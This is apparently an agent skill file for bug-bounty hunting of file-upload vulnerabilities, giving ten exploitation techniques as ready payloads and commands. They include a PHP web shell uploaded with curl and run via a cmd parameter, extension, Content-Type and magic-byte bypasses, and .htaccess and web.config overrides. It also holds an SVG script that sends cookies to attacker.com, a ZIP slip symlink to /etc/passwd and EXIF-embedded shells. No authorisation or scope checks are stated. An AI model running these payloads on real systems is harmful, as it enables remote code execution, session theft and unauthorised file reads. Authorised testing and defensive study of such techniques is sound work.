---
name: hunt-file-upload
description: |
  File upload vulnerability hunting. 10 exploitation techniques including
  direct upload, double extension, magic byte injection, ZIP slip, SVG XSS,
  polyglot images, XML-based upload attacks, Content-Type manipulation,
  .htaccess/web.config override, and filename injection.
triggers:
  - hunt file upload
  - file upload vulnerability
  - upload testing
  - file upload bypass
  - unrestricted file upload
  - test upload functionality
category: security
---
# File Upload Vulnerability Hunting

Adapted from Claude-BugHunter by ElementalSouls.

---

## 10 File Upload Exploitation Techniques

### Technique 1: Direct Script Upload
Upload a shell file with a web-executable extension:
```bash
# Create a PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload it
curl -X POST -F "file=@shell.php" https://target.com/upload/

# Access the shell
curl https://target.com/uploads/shell.php?cmd=id
```

**Check extensions:** `.php`, `.php5`, `.phtml`, `.asp`, `.aspx`, `.jsp`, `.war`, `.cgi`, `.pl`, `.py`, `.rb`

### Technique 2: Double Extension
```bash
shell.php.jpg       # Server checks last extension (.jpg)
shell.php%00.jpg    # Null byte truncation (old PHP)
shell.php.;.jpg     # PHP treats before ; as extension
shell.php.jpg.php   # Apache may execute as PHP
shell.php.       # Trailing dot — Windows removes it
```

### Technique 3: Content-Type Manipulation
Upload `shell.php` but change Content-Type:
```bash
curl -X POST -F "file=@shell.php;type=image/jpeg" https://target.com/upload/
```

### Technique 4: Magic Byte Injection
```bash
# Prepend image magic bytes to PHP shell
echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
echo -e '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php
echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg.php
```

### Technique 5: .htaccess Override
Upload a `.htaccess` file to make .jpg files executable as PHP:
```apache
AddType application/x-httpd-php .jpg
```
Then upload `shell.jpg` containing PHP code.

### Technique 6: web.config Override (ASP.NET)
Upload a `web.config` to enable unsafe parsing:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.php" verb="*" modules="FastCgiModule" />
    </handlers>
  </system.webServer>
</configuration>
```

### Technique 7: SVG with Script
Upload an SVG with embedded script (XSS or SSRF):
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    document.location='https://attacker.com/steal?c='+document.cookie
  </script>
</svg>
```

### Technique 8: ZIP Slip / Archive Traversal
Create a ZIP with path-traversal filenames:
```bash
# Create a symlink pointing to /etc/passwd
ln -s /etc/passwd symlink.txt
zip --symlinks evil.zip symlink.txt

# Upload and extract — if the server extracts ZIPs, the symlink resolves
# Or: create a ZIP with filenames like ../../../etc/cron.d/malicious
```

### Technique 9: Polyglot Images
Embed payload in EXIF metadata:
```bash
# Embed PHP code in an image's EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg shell.php
# Upload shell.php (passes magic-byte check)
# If server includes the file, not executes it:
include('uploads/shell.php');  # PHP parser evaluates the <?php ?> tag
```

### Technique 10: XML-Based Upload (DOCX, XLSX, SVG)
DOCX/XLSX files are ZIP archives containing XML. Modify the XML for XXE:
```bash
# Unzip a DOCX
unzip doc.docx -d doc_extracted/
# Edit word/document.xml with XXE payload
# Rezip with different extension
```

---

## Detection: What to Look For

### URL Patterns
```
/upload           /file-upload      /media/upload     /api/upload
/import           /import/csv       /import/xml       /profile/photo
/avatar           /attachments      /documents        /images
```

### File Types to Test
| Type | What It Can Do |
|---|---|
| `.php`, `.phtml`, `.php5` | Direct PHP execution |
| `.asp`, `.aspx`, `.ashx` | ASP.NET execution |
| `.jsp`, `.war` | Java execution |
| `.pl`, `.py`, `.rb`, `.cgi` | CGI/PHP execution |
| `.shtml`, `.stm`, `.shtm` | SSI execution |
| `.svg` | XSS (JS execution in browser context) |
| `.xml` | XXE (file read, SSRF) |
| `.docx`, `.xlsx`, `.odt` | XXE via XML in ZIP |
| `.zip`, `.tar`, `.gz` | ZIP slip path traversal |
| `.pdf` | SSRF via PDF inclusion, XSS via JS |
| `.html`, `.htm` | Stored XSS if served without Content-Disposition |
| `.json` | Prototype pollution if parsed unsafely |

### Response Signals
- Server returns URL to uploaded file — directly accessible?
- File is stored on same domain — same origin, can read cookies?
- File is processed/rendered — thumbnails? PDF generation? Virus scanning?
- Original filename preserved? → potential for path traversal

---

## Full Attack Flow

1. **Identify upload endpoints** and understand what file types are accepted
2. **Test basic upload** with a benign file to understand the flow
3. **Bypass extension filters** using techniques 1-6
4. **Bypass content-type** checks using technique 3
5. **Bypass magic-byte** checks using technique 4
6. **Test SVG XSS** if SVG is accepted (technique 7)
7. **Test ZIP slip** if archives are accepted (technique 8)
8. **Test XXE** via XML-based formats (technique 10)
9. **Verify execution** — access the uploaded file, confirm script execution or data exfil

---

## Validation Checklist

Before reporting:
- [ ] File was uploaded and is accessible via URL
- [ ] For RCE: command executed and output confirmed
- [ ] For XSS: OOB callback or browser alert confirmed
- [ ] For XXE: file content returned or OOB callback confirmed
- [ ] For ZIP slip: path traversal to sensitive file confirmed
- [ ] File persists after page refresh (not temp/transient)
- [ ] Impact clearly described
